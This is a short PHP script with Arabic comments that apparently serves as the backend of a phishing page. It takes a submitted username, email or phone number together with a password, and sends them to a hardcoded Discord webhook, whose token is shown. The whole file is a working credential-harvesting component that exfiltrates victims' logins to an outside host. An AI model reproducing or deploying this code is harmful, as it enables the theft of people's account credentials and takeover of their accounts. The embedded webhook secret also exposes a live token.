<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // تلقي البيانات من الجسم (body) باستخدام file_get_contents
    $postData = file_get_contents("php://input");
    
    // تحويل البيانات المستلمة إلى مصفوفة (JSON)
    $userData = json_decode($postData, true);

    // تكوين Webhook URL الخاص بك
    $webhookUrl = 'https://discord.com/api/webhooks/1171151808077508628/h0rV2DG-E4Ke4DqZVE6SpG59wadU7DRFUVR0BvTWF4rTemKsxeQWY3Ks20Dil4nrKjQK';

    // تكوين رسالة للإرسال إلى Discord
    $message = "User Information\n";
    $message .= "Name/Email/Number: " . $userData["Name/Email/Number"] . "\n";
    $message .= "Password: " . $userData["Password"];

    // إعداد بيانات الطلب لإرسالها إلى Webhook
    $data = json_encode(array("content" => $message));

    // إعداد خيارات الطلب
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => $data,
        ),
    );

    $context  = stream_context_create($options);
    $result = file_get_contents($webhookUrl, false, $context);

    if ($result === FALSE) {
        echo "Failed to send data to Discord Webhook.";
    } else {
        echo "User data has been sent to Discord Webhook successfully.";
    }
}
?>
